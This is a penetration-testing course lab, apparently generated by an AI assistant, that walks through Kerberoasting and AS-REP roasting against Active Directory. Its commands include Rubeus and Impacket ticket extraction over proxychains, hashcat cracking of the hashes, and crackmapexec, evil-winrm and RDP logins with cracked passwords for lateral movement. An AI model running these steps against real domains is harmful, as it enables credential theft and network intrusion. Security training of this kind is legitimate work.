# **

### _Week 10 — Active Directory (AD) Exploitation & Domain Dominance_

**Estimated Time:** 150–210 minutes  
**Difficulty:** Advanced  
**Tools:** Rubeus, Impacket, Hashcat, PowerView, BloodHound, Meterpreter, proxychains, domain‑joined Windows host

---

## **1. Purpose of This Lab**

This lab teaches you two of the most important AD exploitation techniques:

- **Kerberoasting** — extracting service account Kerberos tickets (TGS) and cracking them offline
- **AS‑REP Roasting** — extracting AS‑REP responses for accounts without pre‑authentication

By the end of this lab, you will be able to:

- Identify roastable accounts
- Extract TGS tickets using Rubeus or Impacket
- Extract AS‑REP roastable hashes
- Crack hashes offline with Hashcat
- Use cracked credentials for lateral movement
- Map roasting opportunities in BloodHound

This lab builds directly on Lab 10.1’s enumeration.

---

## **2. Pre‑Lab Requirements**

You must have:

- Completed **Lab 10.1 (AD Enumeration)**
- A foothold on a domain‑joined Windows host
- BloodHound data imported
- Rubeus uploaded to the host
- Impacket installed on Kali
- SOCKS proxy + proxychains configured

Example topology:

```
Kali → Pivot → Domain Host → Domain Controller
```

---

## **3. Lab Tasks**

---

# **Task 1 — Identify Kerberoastable Accounts (BloodHound)**

### **Objective**

Use BloodHound to find accounts with SPNs (Service Principal Names).

### **Steps**

In BloodHound:

- Run query: **“Find Kerberoastable Users”**

### **What to Observe**

- Service accounts with SPNs
- Accounts with weak passwords
- High‑value service accounts (SQL, IIS, backup services)

### **Deliverable**

A list of Kerberoastable accounts.

---

# **Task 2 — Identify AS‑REP Roastable Accounts (BloodHound)**

### **Objective**

Find accounts with **Do not require Kerberos preauthentication** enabled.

### **Steps**

In BloodHound:

- Run query: **“Find AS‑REP Roastable Users”**

### **What to Observe**

- Low‑priv users with preauth disabled
- Legacy accounts
- Service accounts with misconfigurations

### **Deliverable**

A list of AS‑REP roastable accounts.

---

---

# **SECTION A — KERBEROASTING**

---

# **Task 3 — Kerberoast Using Rubeus (Windows)**

### **Objective**

Request TGS tickets for SPN accounts.

### **Steps**

From a shell on the domain‑joined host:

```
Rubeus.exe kerberoast
```

Or for stealth:

```
Rubeus.exe kerberoast /nowrap /format:hashcat
```

### **What to Observe**

- TGS tickets dumped in hash format
- Hashes suitable for offline cracking

### **Deliverable**

A set of Kerberoast hashes.

---

# **Task 4 — Kerberoast Using Impacket (Linux)**

### **Objective**

Perform Kerberoasting from Kali through the pivot.

### **Steps**

```
proxychains python3 GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC-IP> -request
```

### **What to Observe**

- SPN accounts returned
- Hashes dumped

### **Deliverable**

A list of SPNs and hashes.

---

# **Task 5 — Crack Kerberoast Hashes with Hashcat**

### **Objective**

Crack TGS hashes offline.

### **Steps**

Save hashes to `hashes.txt`.

Run Hashcat:

```
hashcat -m 13100 hashes.txt rockyou.txt
```

### **What to Observe**

- Weak service account passwords
- Password reuse
- High‑privilege accounts with weak passwords

### **Deliverable**

A list of cracked Kerberoast passwords.

---

# **Task 6 — Use Cracked Credentials for Lateral Movement**

### **Objective**

Authenticate to internal hosts using cracked service account credentials.

### **Examples**

### SMB:

```
proxychains crackmapexec smb 10.10.10.0/24 -u svc_sql -p Password123
```

### WinRM:

```
proxychains evil-winrm -i 10.10.10.25 -u svc_backup -p Winter2024!
```

### RDP:

```
proxychains xfreerdp /u:svc_iis /p:Welcome1 /v:10.10.10.30
```

### **What to Observe**

- Service accounts often have local admin rights
- Lateral movement becomes trivial
- New pivot opportunities

### **Deliverable**

A list of hosts accessible with cracked credentials.

---

---

# **SECTION B — AS‑REP ROASTING**

---

# **Task 7 — AS‑REP Roast Using Rubeus (Windows)**

### **Objective**

Request AS‑REP hashes for accounts without preauth.

### **Steps**

```
Rubeus.exe asreproast
```

### **What to Observe**

- AS‑REP hashes dumped
- No authentication required

### **Deliverable**

A set of AS‑REP hashes.

---

# **Task 8 — AS‑REP Roast Using Impacket (Linux)**

### **Objective**

Perform AS‑REP roasting from Kali.

### **Steps**

```
proxychains python3 GetNPUsers.py <domain>/ -dc-ip <DC-IP> -usersfile users.txt
```

### **What to Observe**

- AS‑REP hashes for vulnerable accounts

### **Deliverable**

A list of AS‑REP roastable accounts and hashes.

---

# **Task 9 — Crack AS‑REP Hashes with Hashcat**

### **Objective**

Crack AS‑REP hashes offline.

### **Steps**

```
hashcat -m 18200 asrep.txt rockyou.txt
```

### **What to Observe**

- AS‑REP hashes crack faster than Kerberoast
- Often low‑priv accounts with weak passwords

### **Deliverable**

A list of cracked AS‑REP passwords.

---

# **Task 10 — Use Cracked AS‑REP Credentials for Lateral Movement**

### **Objective**

Use cracked credentials to access internal hosts.

### **Examples**

```
proxychains crackmapexec smb 10.10.20.0/24 -u jdoe -p Summer2023!
```

### **What to Observe**

- Low‑priv accounts may have local admin rights
- Password reuse across hosts
- New footholds deeper in the network

### **Deliverable**

A list of hosts accessible with AS‑REP credentials.

---

---

# **Task 11 — Build a Roasting Attack Surface Map**

### **Objective**

Document all roasting opportunities and cracked credentials.

### **Include:**

- Kerberoastable accounts
- AS‑REP roastable accounts
- Cracked passwords
- Hosts accessible
- Lateral movement paths
- New pivot opportunities

### **Deliverable**

A complete roasting attack surface map in your Obsidian vault.

---

## **4. Completion Criteria**

You have completed Lab 10.2 when you can:

- Identify Kerberoastable and AS‑REP roastable accounts
- Extract TGS and AS‑REP hashes
- Crack hashes offline
- Use cracked credentials for lateral movement
- Document roasting attack paths
- Prepare for domain privilege escalation (DCSync, delegation abuse)

---

## **5. Next Steps**

When you’re ready, say:

**“Next lab.”**

And I’ll generate **Lab 10.3 — DCSync, Golden Tickets & Domain Dominance** in the same course style.